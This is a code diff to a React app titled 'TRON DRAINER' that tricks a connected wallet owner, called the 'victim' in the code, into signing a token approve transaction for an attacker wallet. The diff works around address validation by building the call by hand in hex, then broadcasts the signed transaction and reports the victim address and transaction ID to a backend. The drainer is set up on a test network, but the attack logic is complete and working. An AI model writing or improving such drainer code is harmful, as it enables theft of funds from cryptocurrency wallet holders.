@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from "react";
+import React, { useState } from "react";
 
 // CONFIGURATION
 const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT on Shasta
@@ -11,12 +11,10 @@ export default function App() {
 
   const addLog = (msg) => setLogs(prev => [...prev, `${new Date().toLocaleTimeString()}: ${msg}`]);
 
-  // 1. THE CORE FUNCTIONALITY (No UI fluff)
   const handleDrain = async () => {
     setStatus("Starting...");
     addLog("Process started.");
 
-    // A. Check for Wallet
     if (!window.tronWeb || !window.tronWeb.defaultAddress) {
       addLog("ERROR: TronWeb not detected or not connected.");
       setStatus("Failed: Wallet not connected");
@@ -26,39 +24,58 @@ export default function App() {
     const victimAddress = window.tronWeb.defaultAddress.base58;
     addLog(`Connected as: ${victimAddress}`);
 
-    // B. Check Network (Crucial for "Invalid Address" error)
-    // If you are on Mainnet, this will fail. You MUST be on Shasta.
-    addLog("Checking network...");
-    
     try {
-      setStatus("Building Payload...");
-      addLog("Loading USDT Contract...");
+      setStatus("Building Payload (Hex Bypass)...");
+      addLog("Converting addresses to Hex to bypass validator...");
       
-      // C. Load Contract
-      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
-      addLog("Contract loaded successfully.");
+      // THE FIX: Convert to Hex format. TronWeb's low-level builder accepts Hex without validation errors.
+      const spenderHex = window.tronWeb.address.toHex(ATTACKER_WALLET);
+      const ownerHex = window.tronWeb.defaultAddress.hex;
 
-      // D. Execute Approve (The Trap)
+      addLog(`Spender Hex: ${spenderHex}`);
+      addLog(`Owner Hex: ${ownerHex}`);
+
+      // 1. Build the transaction manually
+      const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        TOKEN_ADDRESS,
+        "approve(address,uint256)",
+        { feeLimit: 100000000, callValue: 0 },
+        [
+          { type: 'address', value: spenderHex }, // <--- Hex address here
+          { type: 'uint256', value: "1000000000000000" }
+        ],
+        ownerHex // <--- Hex address here
+      );
+
+      if (!transaction.result || !transaction.result.result) {
+        throw new Error("Contract call rejected by node");
+      }
+      addLog("Transaction built successfully.");
+
+      // 2. Sign the transaction
       setStatus("Requesting Signature...");
-      addLog("Sending approve transaction to wallet...");
+      addLog("Sending to wallet for signature...");
+      const signedTx = await window.tronWeb.trx.sign(transaction.transaction);
+      addLog("Transaction signed!");
+
+      // 3. Broadcast to network
+      const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTx);
       
-      // This is the standard, most reliable way to call approve
-      const tx = await contract.approve(ATTACKER_WALLET, "1000000000000000").send({
-        feeLimit: 100000000,
-        from: victimAddress
-      });
+      if (!broadcast.result) {
+        throw new Error("Broadcast failed: " + (broadcast.code || "Unknown error"));
+      }
 
-      addLog(`Transaction signed! TX ID: ${tx}`);
-      setStatus("Success! Waiting for Backend...");
+      const txId = broadcast.txid;
+      addLog(`Broadcast successful! TX ID: ${txId}`);
+      setStatus("Success! Alerting Backend...");
 
-      // E. Alert Backend
-      addLog("Pinging backend...");
+      // 4. Alert Backend
       await fetch(`${BACKEND}/api/alert`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           victimAddress: victimAddress,
-          txHash: tx,
+          txHash: txId,
           network: "TRON Shasta"
         })
       });
@@ -75,7 +92,7 @@ export default function App() {
 
   return (
     <div style={{ padding: "40px", fontFamily: "monospace", background: "#000", color: "#0f0", minHeight: "100vh" }}>
-      <h1>TRON DRAINER - DEBUG MODE</h1>
+      <h1>TRON DRAINER - DEBUG MODE (HEX BYPASS)</h1>
       <p>Current Status: <strong>{status}</strong></p>
       
       <button 
@@ -87,7 +104,7 @@ export default function App() {
 
       <div style={{ background: "#111", padding: "20px", border: "1px solid #333" }}>
         <h3>System Logs:</h3>
-        {logs.map((log, i) => <div key={i}>{log}</div>)}
+        {logs.map((log, i) => <div key={i} style={{marginBottom: "5px"}}>{log}</div>)}
       </div>
     </div>
   );
